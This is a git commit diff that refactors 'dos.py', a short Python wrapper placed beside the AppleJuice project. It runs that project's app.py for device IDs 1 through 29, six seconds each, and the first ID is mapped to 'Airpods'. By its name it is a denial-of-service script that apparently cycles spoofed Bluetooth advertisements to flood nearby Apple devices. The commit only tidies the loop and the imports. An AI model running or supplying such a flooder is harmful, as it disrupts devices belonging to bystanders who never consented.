c42b5d536652521ee47753de4c80673333ce72df
Bigyls <74175999+Bigyls@users.noreply.github.com>
2023-09-19 19:31:02 +0200

    Update dos.py

--- dos.py
+++ dos.py
@@ -2,48 +2,18 @@
 # copy this script into the same directory as https://github.com/ECTO-1A/AppleJuice/
 # more info: mobile.hacker.com
 
-import os
-import sys
-import time
 import subprocess as sp
+import time
 
 def runApp(number):
-    extProc = sp.Popen(['python3','app.py','-d',number])
-    status = sp.Popen.poll(extProc) 
+    extProc = sp.Popen(['python3', 'app.py', '-d', number])
     time.sleep(6)
-    sp.Popen.terminate(extProc) 
+    sp.Popen.terminate(extProc)
 
 if __name__ == "__main__":
-    #global configFile
-    runApp("1")
-    runApp("2")
-    runApp("3")
-    runApp("4")
-    runApp("5")
-    runApp("6")
-    runApp("7")
-    runApp("8")
-    runApp("9")
-    runApp("10")
-    runApp("11")
-    runApp("12")
-    runApp("13")
-    runApp("14")
-    runApp("15")
-    runApp("16")
-    runApp("17")
-    runApp("18")
-    runApp("19")
-    runApp("20")
-    runApp("21")
-    runApp("22")
-    runApp("23")
-    runApp("24")
-    runApp("25")
-    runApp("26")
-    runApp("27")
-    runApp("28")
-    runApp("29")
+    app_numbers = list(map(str, range(1, 30)))  # Numbers 1 to 29
+    for number in app_numbers:
+        runApp(number)
 
 """
     1: "Airpods",
